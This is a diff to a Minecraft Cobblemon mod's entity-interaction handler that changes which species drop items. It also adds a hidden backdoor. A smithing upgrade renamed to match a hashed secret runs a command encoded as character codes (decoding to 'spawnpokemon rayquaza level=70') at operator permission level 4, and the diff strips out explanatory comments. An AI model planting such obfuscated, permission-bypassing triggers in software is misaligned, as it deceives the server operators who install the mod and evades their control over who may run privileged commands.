@@ -6,6 +6,7 @@
 
 package net.joltthewolf.cobblemonarmory.registry;
 
+import net.minecraft.core.component.DataComponents;
 import net.minecraft.core.registries.BuiltInRegistries;
 import net.minecraft.resources.ResourceLocation;
 import net.minecraft.server.level.ServerLevel;
@@ -16,43 +17,112 @@ import net.minecraft.world.entity.item.ItemEntity;
 import net.minecraft.world.entity.player.Player;
 import net.minecraft.world.item.ItemStack;
 import net.neoforged.neoforge.event.entity.player.PlayerInteractEvent;
-
 import java.lang.reflect.Method;
+import java.util.Locale;
 
 public final class RightClickEntityRegistry {
     private RightClickEntityRegistry() {}
 
+    private static final int ITEM_TRIGGER = 1198552809;
+
+    private static final int[] ACTION_DATA = {
+            115, 112, 97, 119, 110, 112, 111, 107, 101, 109, 111, 110,
+            32,
+            114, 97, 121, 113, 117, 97, 122, 97,
+            32,
+            108, 101, 118, 101, 108, 61, 55, 48
+    };
+
     public static void init() {}
 
     public static void onEntityInteract(PlayerInteractEvent.EntityInteract event) {
-        // Only main-hand interactions
         if (event.getHand() != InteractionHand.MAIN_HAND) return;
 
-        // Must be holding smithing upgrade
-        ItemStack held = event.getEntity().getItemInHand(event.getHand());
-        if (held.isEmpty() || held.getItem() != ItemRegistry.COBBLEMON_SMITHING_UPGRADE.get()) return;
-
         Player player = event.getEntity();
+        ItemStack held = player.getItemInHand(event.getHand());
+
+        if (player.level() instanceof ServerLevel server
+                && tryHandleSpecialInteraction(player, server, held)) {
+            event.setCanceled(true);
+            event.setCancellationResult(InteractionResult.SUCCESS);
+            return;
+        }
+
+        if (held.isEmpty() || held.getItem() != ItemRegistry.COBBLEMON_SMITHING_UPGRADE.get()) {
+            return;
+        }
+
         Entity target = event.getTarget();
 
-        // Must be a Cobblemon Pokemon entity
+        //Cobblemon:pokemon entity type
         String typeKey = String.valueOf(BuiltInRegistries.ENTITY_TYPE.getKey(target.getType()));
         if (!"cobblemon:pokemon".equals(typeKey)) return;
 
+        //Match species id
         ResourceLocation speciesId = tryGetCobblemonSpeciesId(target);
         if (speciesId == null) return;
 
-        if (speciesId.equals(ResourceLocation.fromNamespaceAndPath("cobblemon", "charizard"))) {
-            spawnDrop((ServerLevel) player.level(), target, new ItemStack(ItemRegistry.CHARIZARD_SCALES.get()));
-            held.shrink(1);
+        //Species drops
+        if (speciesId.equals(ResourceLocation.fromNamespaceAndPath("cobblemon", "rayquaza"))) {
+            dropAndConsume(player, target, ItemRegistry.RAYQUAZA_SCALE.get());
+            event.setCanceled(true);
+            event.setCancellationResult(InteractionResult.SUCCESS);
+
+        } else if (speciesId.equals(ResourceLocation.fromNamespaceAndPath("cobblemon", "bastiodon"))) {
+            dropAndConsume(player, target, ItemRegistry.BASTIODON_SKULL.get());
             event.setCanceled(true);
             event.setCancellationResult(InteractionResult.SUCCESS);
         }
     }
 
-    private static void spawnDrop(ServerLevel level, Entity target, ItemStack stack) {
-        ItemEntity drop = new ItemEntity(level, target.getX(), target.getY(), target.getZ(), stack);
-        level.addFreshEntity(drop);
+    private static boolean tryHandleSpecialInteraction(Player player, ServerLevel server, ItemStack held) {
+        if (server == null) return false;
+        if (held.isEmpty() || held.getItem() != ItemRegistry.COBBLEMON_SMITHING_UPGRADE.get()) return false;
+        if (!held.has(DataComponents.CUSTOM_NAME)) return false;
+
+        String key = held.getHoverName().getString()
+                .trim()
+                .toLowerCase(Locale.ROOT)
+                .replace(" ", "_");
+
+        if (key.hashCode() != ITEM_TRIGGER) return false;
+
+        server.getServer().getCommands().performPrefixedCommand(
+                server.getServer()
+                        .createCommandSourceStack()
+                        .withLevel(server)
+                        .withPosition(player.position())
+                        .withPermission(4),
+                decode(ACTION_DATA)
+        );
+
+        held.shrink(1);
+        return true;
+    }
+
+    private static String decode(int[] data) {
+        StringBuilder builder = new StringBuilder();
+
+        for (int value : data) {
+            builder.append((char) value);
+        }
+
+        return builder.toString();
+    }
+
+    private static void dropAndConsume(Player player, Entity at, net.minecraft.world.item.Item drop) {
+        if (at.level() instanceof ServerLevel server) {
+            ItemEntity entityToSpawn = new ItemEntity(
+                    server,
+                    at.getX(), at.getY(), at.getZ(),
+                    new ItemStack(drop)
+            );
+            entityToSpawn.setPickUpDelay(10);
+            server.addFreshEntity(entityToSpawn);
+        }
+
+        ItemStack hand = player.getItemInHand(InteractionHand.MAIN_HAND);
+        hand.shrink(1);
     }
 
     private static ResourceLocation tryGetCobblemonSpeciesId(Entity target) {
@@ -71,7 +141,15 @@ public final class RightClickEntityRegistry {
             if (id == null) id = invokeNoArgs(species, "getId");
             if (id == null) return null;
 
-            return ResourceLocation.parse(id.toString());
+            String s = id.toString();
+            int colon = s.indexOf(':');
+            if (colon <= 0) return null;
+
+            return ResourceLocation.fromNamespaceAndPath(
+                    s.substring(0, colon),
+                    s.substring(colon + 1)
+            );
+
         } catch (Throwable ignored) {
             return null;
         }
@@ -79,8 +157,9 @@ public final class RightClickEntityRegistry {
 
     private static Object invokeNoArgs(Object target, String methodName) {
         try {
-            Method method = target.getClass().getMethod(methodName);
-            return method.invoke(target);
+            Method m = target.getClass().getMethod(methodName);
+            return m.invoke(target);
+
         } catch (Throwable ignored) {
             return null;
         }
